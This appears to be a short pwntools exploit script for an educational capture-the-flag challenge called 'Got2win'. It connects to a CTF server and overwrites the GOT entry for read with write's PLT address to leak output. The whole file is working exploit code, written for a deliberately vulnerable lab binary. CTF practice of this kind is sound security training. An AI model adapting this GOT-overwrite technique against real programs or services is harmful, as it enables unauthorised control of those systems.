from pwn import *
from pwnlib.util.packing import p64

context.arch = "amd64"
# context.log_level = "debug"

r = remote("edu-ctf.zoolab.org", 30203)

# r = process("./Got2win/share/got2win")

read_got = 0x404038

# Every time the library is mapped to the memory space may not be the same,
# So it's better go with plt than hardcoded got value.
write_plt = 0x4010c0

r.sendlineafter(b"Overwrite addr: ", str(read_got))
r.sendafter(b"Overwrite 8 bytes value: ", p64(write_plt))

print(r.recvall().decode())

